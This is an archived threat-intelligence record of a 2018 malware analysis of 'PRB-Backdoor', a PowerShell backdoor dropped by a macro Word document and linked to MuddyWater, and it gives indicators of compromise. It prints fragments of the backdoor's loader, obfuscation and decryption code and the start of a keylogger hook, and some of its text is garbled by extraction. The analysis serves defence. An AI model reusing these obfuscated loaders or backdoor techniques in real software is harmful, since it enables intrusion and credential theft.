{
    "id": "a95447f8-f60c-49b6-ae3d-5ffa44642748",
    "created_at": "2023-01-12T15:10:14.674993Z",
    "updated_at": "2025-03-27T02:16:14.150197Z",
    "deleted_at": null,
    "sha1_hash": "1861e965d635f7c1b10cb280ad652b563d9a2f5f",
    "title": "2018-05-12 - PRB-Backdoor - A Fully Loaded PowerShell Backdoor with Evil Intentions",
    "authors": "",
    "file_creation_date": "2022-05-29T01:01:27Z",
    "file_modification_date": "2022-05-29T01:01:27Z",
    "file_size": 352357,
    "plain_text": "# PRB-Backdoor - A Fully Loaded PowerShell Backdoor with Evil Intentions\n\n**sec0wn.blogspot.com/2018/05/prb-backdoor-fully-loaded-powershell.html**\n\nMo Bustami\n\n## INTRODUCTION\n\n[The great people at ClearSky reached out to me a couple of days ago regarding a sample that they suspected could be related to](https://www.clearskysec.com/)\nMuddyWater.\n\nThey suspected so because the sample had some similarities with the way MuddyWater lures look like and some similarities in some\nPowerShell obfuscation, in specific the character substitution routine.\n\nMuddyWater Sample\n\nNew Sample\n\nHowever, after analyzing the sample and investigating it more, I was able to showcase that this is indeed something different but nonetheless\ninteresting. This blog is a walk through my analysis and will highlight initial insights into this potential attack.\n\n## THE SAMPLE - FROM AIRMILES TO MACRO CODE TO POWERSHELL\n\nThe sample that was shared with me is a macro laced word document called \"Egyptairplus.doc\" with an MD5 hash\nof fdb4b4520034be269a65cfaee555c52e. The macro code contains a function called Worker() which calls multiple other functions embedded\nin the document to ultimately run a PowerShell command:\n\n\n-----\n\n_po e s_ _C byp SS CO_ _a_ _& {$pt_ _\\ ocu_ _e t ;$ t_ _;$ t ge_ _cO t_ _t pat_ _$_ _e co_ _G aSC ; O_ _ac ($_ _$_ _){_\n_($I.Length -Gt 7700){$rt='';$Dt=geT-cOntEnt -patH $PTH -eNcoDInG aSCIi;FOrEach($I in $DT){iF ($I.Length -Gt 7700){$rt=$i.sPLIt('**')_\n\n_[2];BREak}};$rt=[syStEm.TExT.eNCODing]::asCII.gEtsTrIng([sysTEm.ConverT]::FROmbaSe64sTriNG($rT));IEX($RT);_\nThis command looks for a chunk of data that is embedded in the actual document and begins with \"**\" and then takes that code and Base64\ndecodes it. The result is a PowerShell script that looks like this\n_function main_\n_{_\n\n_$content=\"ZnVuY3Rpb24gejB3MnVQZVgoJHNLUHYpewogICAgJHNLUHYgPSAkc0tQdi5Ub0NoYXJBcnJheSgpCiAgICBbYXJyYXldOjpSZXZlcnN_\n_..._\n_..._\n_..._\n_... Truncated code..._\n_2ZhbHNlIiwgMCkp\"_\n_[string]$decode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($content))_\n_iex $decode_\n_}_\n_main_\nReplacing iex with Write-Output and running this code will result in a second layer PowerShell script that is shown earlier in the blog and has\nsimilarities with MuddyWater code due to the use of the Character Substitution functions. Below is a snippet of the code:\n_function z0w2uPeX($sKPv){_\n_$sKPv = $sKPv.ToCharArray()_\n_[array]::Reverse($sKPv)_\n_$G8JdH = -join($sKPv)_\n_return $G8JdH_\n_}_\n_function FQdZ7EqW($fpuD){_\n_$fpuD = $fpuD.Replace('#a#', \"`n\").Replace('#b#', '\"').Replace('#c#', \"'\").Replace('#d#', \"$\").Replace('#e#', \"``\")_\n_return $fpuD_\n_}_\n_iex(FQdZ7EqW(\"{4}{5}{6}{1}{2}{0}{3}\" -f (z0w2uPeX(\"1 sd\")),\"Se\",\"con\",\"0\",\"S\",\"tart-Slee\",(z0w2uPeX(\"- p\")), 0))_\n_iex(FQdZ7EqW(\"{2}{1}{5}{0}{4}{3}\" -f (z0w2uPeX(\" yeWs60\")),(z0w2uPeX(\"ob\")),\"[\",\"e\",(z0w2uPeX(\"urT#d# =\")),\"ol]#d#gS\", 0))_\nOnce you replace all the iex with Write-Output you will end up with more readable code as shown below\n\nThis code still contains encoded chunks of data. Two interesting pieces are Invoker.ps1 and js.hta\nThe Invoker.ps1 script is used to decrypt the main Backdoor code as shown below:\n_$nxUHOcAE = \"0ef4b1acb4394766\" #This is the Key used to Decrypt the main Backdoor code_\n_$xWCWwEep = \"{path}\"_\n\n_[string]$BJgVSQMa = Get-Content -Path $xWCWwEep -Force_\n_$nl3hMTam = new-object system.security.cryptography.RijndaelManaged_\n_$nl3hMTam.Mode = [System.Security.Cryptography.CipherMode]::ECB_\n_$nl3hMTam.Padding = [System.Security.Cryptography.PaddingMode]::Zeros_\n_$nl3hMTam.BlockSize = 128_\n_$nl3hMTam.KeySize = 128_\n_$nl3hMTam.Key = [System.Text.Encoding]::UTF8.GetBytes($nxUHOcAE)_\n_$W9NYYLlk = [System.Convert]::FromBase64String($BJgVSQMa)_\n_$Oj5PebcQ = $nl3hMTam.CreateDecryptor();_\n_$mL9fRirD = $Oj5PebcQ.TransformFinalBlock($W9NYYLlk, 0, $W9NYYLlk.Length);_\n\n_[string]$Pru8pJC5 = [System.Text.Encoding]::UTF8.GetString($mL9fRirD).Trim('*')_\n_Write-Output $Pru8pJC5 #I replaced iex with Write-Output_\n_while($true){_\n_start-sleep -seconds 3_\n_}_\n\n\n-----\n\ne t e e c ypted ac doo code s passed t oug t s sc pt t be dec ypted to t e u edged ac doo code a s a g a s ppet\nof the code here as the full code of the backdoor is over 2000 lines of code when properly formatted.\n\nNotice the main function name PRB hence the name I have given it \"PRB-Backdoor\"\n\n## POTENTIAL COMMAND & CONTROL\n\nRunning the sample in a sandbox did not show any network communication. However, during the analysis of the code I noticed early on a\nvariable with the value $hash.httpAddress =\"http://outl00k[.]net\" This looks like the main domain that the backdoor communicates with for all of\nit's different functions.\nDoing some Passive DNS and WHOIS lookup we can get additional information on the domain:\n_Domain Name: outl00k.net_\n_Registrar WHOIS Server: whois.joker.com_\n_Registrar URL: http://joker.com/_\n_Updated Date: 2018-04-25T03:32:22Z_\n_Creation Date: 2018-01-01T11:35:58Z_\n_Registrant Name: Simon Nitoo_\n_Registrant Street: Tehran_\n_Registrant City: Tehran_\n_Registrant State/Province: Tehran_\n_Registrant Postal Code: 231423465_\n_Registrant Country: IR_\n_Registrant Phone: +98.2189763584_\n_Registrant Email: simon.nitoo@chmail.ir_\n_Registry Admin ID:_\n_Admin Name: Simon Nitoo_\n_Admin Street: Tehran_\n_Admin City: Tehran_\n_Admin State/Province: Tehran_\n_Admin Postal Code: 231423465_\n_Admin Country: IR_\n_Admin Phone: +98.2189763584_\n_Admin Email: simon.nitoo@chmail.ir_\n_Registry Tech ID:_\n_Tech Name: Simon Nitoo_\n_Tech Street: Tehran_\n_Tech City: Tehran_\n_Tech State/Province: Tehran_\n_Tech Postal Code: 231423465_\n_Tech Country: IR_\n_Tech Phone: +98.2189763584_\n_Tech Email: simon.nitoo@chmail.ir_\n_Name Server: ns1.outl00k.net_\n_Name Server: ns2.outl00k.net_\nThe Registrant email address is also used for another domain LinLedin[.]net\nBoth domains are currently resolving to the following IP addresses\n_outl00k[.]net - 74.91.19[.]118 up until May 10, 2018_\n_LinLedin[.]net - 5.160.124[.]99 on April 30, 2018_\nAs of the writing of this blog, there doesn't seem to be much information about either of those domains.\n\n## PRB-BACKDOOR FUNCTIONALITY - AN EARLY LOOK\n\nI am yet to go through the whole code of the backdoor however below is an initial look into the functionality of it based on initial analysis\n\n\n-----\n\nac doo as t e o o g u ct o s\n**PRB-CREATEALIVE and PRB-CREATEINTRODUCE - those two functions seem to be related to initial communication and registration**\nwith the C&C\n\n**PRB-HISTORY is a function that looks to grab the browsing history from different browsers including Chrome, IE and FireFox. It utilizes a**\nsub function called GET-HISTORY\n\n**PRB-PASSWORD**\n**PRB-WRITEFILE**\n**PRB-READFILE**\n**PRB-FUNCTUPDATE**\n**PRB-SHELL**\n**PRB-LOGGER**\n**SNAP - takes a screenshot of the screen**\n**sysinfo - gets the system info**\nAnd many more functions.\n\nAt some point in the code there is even what seems to be .NET/C# code snippets\n_$dsc = @\"_\n_using System;_\n_using System.IO;_\n_using System.Diagnostics;_\n_using System.Runtime.InteropServices;_\n_using System.Windows.Forms;_\n_using System.Text;_\n\n_namespace dDumper_\n_{_\n_public static class Program_\n_{_\n_private const int WH_KEYBOARD_LL = 13;_\n_private const int WM_KEYDOWN = 0x0100;_\n_private const int WM_SYSTEMKEYDOWN = 0x0104;_\n_private const int WM_KEYUP = 0x0101;_\n_private const int WM_SYSTEMKEYUP = 0x0105;_\n\n## FINAL THOUGHTS\n\nThe PRB-Backdoor seems to be a very interesting piece of malware that is aimed to run on the victim machine and gather information, steal\npasswords, log keystrokes and perform many other functions. I could not find any reference to the backdoor or its code in any public source.\nI would imagine there would be other lures and samples out there and hopefully other researchers that would be able to dive deeper into the\ncode and reveal additional details. I will do so as soon as I have additional time but I thought it would be beneficial to share these initial\nfindings in hope to shed some light into this activity.\n\n## INDICATORS OF COMPROMISE\n\nfdb4b4520034be269a65cfaee555c52e\n_outl00k[.]net_\n_LinLedin[.]net_\n_74.91.19[.]118_\n_5.160.124[.]99_\n\n## Clearing the MuddyWater - Analysis of new MuddyWater Samples\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-05-12 - PRB-Backdoor - A Fully Loaded PowerShell Backdoor with Evil Intentions.pdf"
    ],
    "report_names": [
        "2018-05-12 - PRB-Backdoor - A Fully Loaded PowerShell Backdoor with Evil Intentions.pdf"
    ],
    "threat_actors": [
        {
            "id": "2ed8d590-defa-4873-b2de-b75c9b30931e",
            "created_at": "2023-01-06T13:46:38.730137Z",
            "updated_at": "2025-03-27T02:00:02.903261Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "Boggy Serpens",
                "Mango Sandstorm",
                "TEMP.Zagros",
                "Static Kitten",
                "G0069",
                "TA450",
                "Earth Vetala",
                "Seedworm",
                "COBALT ULSTER",
                "ATK51"
            ],
            "source_name": "MISPGALAXY:MuddyWater",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "31e69945-6c1e-40c3-ba8e-a77e81dd142a",
            "created_at": "2024-05-01T02:03:08.047377Z",
            "updated_at": "2025-03-27T02:05:17.326452Z",
            "deleted_at": null,
            "main_name": "COBALT ULSTER",
            "aliases": [
                "ENT-11 ",
                "ITG17 ",
                "MERCURY ",
                "Mango Sandstorm ",
                "MuddyWater ",
                "STAC 1171 ",
                "Seedworm ",
                "Static Kitten ",
                "TEMP.Zagros ",
                "UNC3313 ",
                "Yellow Nix ",
                "Earth Vetala "
            ],
            "source_name": "Secureworks:COBALT ULSTER",
            "tools": [
                " Canopy",
                " CrackMapExec",
                " CredNinja",
                " Empire",
                " FORELORD",
                " Koadic",
                " LaZagne",
                " Ligolo",
                " MKL64",
                " Metasploit",
                " Mimikatz",
                " MiniDump",
                " Mori",
                " MuddyC2Go",
                " MuddyC3",
                " PhonyC2",
                " Plink",
                " PowGoop",
                " PowerStats",
                " RemoteUtilities",
                " Revsocks",
                " ScreenConnect",
                " SimpleHelp",
                " Small Sieve",
                " Syncro",
                " Venom Proxy",
                " WMIExec",
                "AnyDesk"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "02e1c2df-8abd-49b1-91d1-61bc733cf96b",
            "created_at": "2022-10-25T15:50:23.308924Z",
            "updated_at": "2025-03-27T02:00:55.437268Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "MuddyWater",
                "Earth Vetala",
                "Static Kitten",
                "Seedworm",
                "TEMP.Zagros",
                "Mango Sandstorm",
                "TA450"
            ],
            "source_name": "MITRE:MuddyWater",
            "tools": [
                "STARWHALE",
                "POWERSTATS",
                "Out1",
                "PowerSploit",
                "Small Sieve",
                "Mori",
                "Mimikatz",
                "LaZagne",
                "PowGoop",
                "CrackMapExec",
                "ConnectWise",
                "SHARPSTATS",
                "RemoteUtilities",
                "Koadic"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3c430d71-ab2b-4588-820a-42dd6cfc39fb",
            "created_at": "2022-10-25T16:07:23.880522Z",
            "updated_at": "2025-03-27T02:02:10.010443Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "ATK 51",
                "Boggy Serpens",
                "Cobalt Ulster",
                "ITG17",
                "Mango Sandstorm",
                "MuddyWater",
                "Operation BlackWater",
                "Operation Earth Vetala",
                "Operation Quicksand",
                "Seedworm",
                "Static Kitten",
                "T-APT-14",
                "TA450",
                "TEMP.Zagros",
                "Yellow Nix"
            ],
            "source_name": "ETDA:MuddyWater",
            "tools": [
                "Agentemis",
                "BugSleep",
                "CLOUDSTATS",
                "ChromeCookiesView",
                "Cobalt Strike",
                "CobaltStrike",
                "CrackMapExec",
                "DELPHSTATS",
                "EmPyre",
                "EmpireProject",
                "FruityC2",
                "Koadic",
                "LOLBAS",
                "LOLBins",
                "LaZagne",
                "Living off the Land",
                "MZCookiesView",
                "Meterpreter",
                "Mimikatz",
                "MuddyC2Go",
                "MuddyRot",
                "Mudwater",
                "POWERSTATS",
                "PRB-Backdoor",
                "PhonyC2",
                "PowGoop",
                "PowerShell Empire",
                "PowerSploit",
                "Powermud",
                "QUADAGENT",
                "SHARPSTATS",
                "SSF",
                "Secure Socket Funneling",
                "Shootback",
                "Smbmap",
                "Valyria",
                "chrome-passwords",
                "cobeacon",
                "prb_backdoor"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536214,
    "ts_updated_at": 1743041774,
    "ts_creation_date": 1653786087,
    "ts_modification_date": 1653786087,
    "files": {
        "pdf": "https://archive.orkl.eu/1861e965d635f7c1b10cb280ad652b563d9a2f5f.pdf",
        "text": "https://archive.orkl.eu/1861e965d635f7c1b10cb280ad652b563d9a2f5f.txt",
        "img": "https://archive.orkl.eu/1861e965d635f7c1b10cb280ad652b563d9a2f5f.jpg"
    }
}